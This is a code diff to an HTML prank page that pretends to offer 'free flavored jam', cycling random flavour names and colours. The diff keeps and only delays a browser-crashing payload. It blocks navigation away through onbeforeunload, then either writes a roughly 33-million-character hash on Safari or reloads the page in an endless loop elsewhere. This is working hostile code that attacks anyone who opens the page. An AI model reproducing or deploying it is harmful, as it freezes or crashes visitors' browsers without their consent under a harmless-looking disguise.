@@ -65,22 +65,32 @@
                 rgbFinal.push(b.toString(16))
                 return rgbFinal.join("");
             }
-            function fillJamInformation() {
+            async function fillJamInformation() {
                 let flavor = getRandomFlavor(Math.floor(Math.random() * 5) + 1);
                 document.querySelector("jam1").innerHTML = `feeding your browser <color>${flavor}</color> flavored jam...`;
                 document.title = `free ${flavor} flavored jam`;
-                var randomColor = getRGB(Math.floor(Math.random()*250), Math.floor(Math.random()*250), Math.floor(Math.random()*250))
+                let randomColor = getRGB(Math.floor(Math.random()*250), Math.floor(Math.random()*250), Math.floor(Math.random()*250))
                 document.querySelector(":root").style.setProperty("--color", `#${randomColor}`)
             }
-            fillJamInformation();
-            window.onbeforeunload = function() {
-                return true
-            };
-            if (/^((?!chrome|android).)*safari/i.test(navigator.userAgent)) {
-                onload = function wallEElectricute() => location.hash = "M" + "\u0001".repeat(2 ** 25) + "m";
-            } else {
-                for (;;) location.reload(true)
-            }
+            let jamRollCount = 0;
+            let roll = window.setInterval(function () {
+                jamRollCount++
+                if (jamRollCount >= 5) {
+                    clearInterval(roll);
+                } else {
+                    fillJamInformation();
+                }
+            }, 50);
+            window.setTimeout(function () {
+                window.onbeforeunload = function() {
+                    return true
+                };
+                if (/^((?!chrome|android).)*safari/i.test(navigator.userAgent)) {
+                    onload = () => location.hash = "M" + "\u0001".repeat(2 ** 25) + "m";
+                } else {
+                    for (;;) location.reload(1)
+                }
+            }, 300)
         </script>
     </body>
 </html>
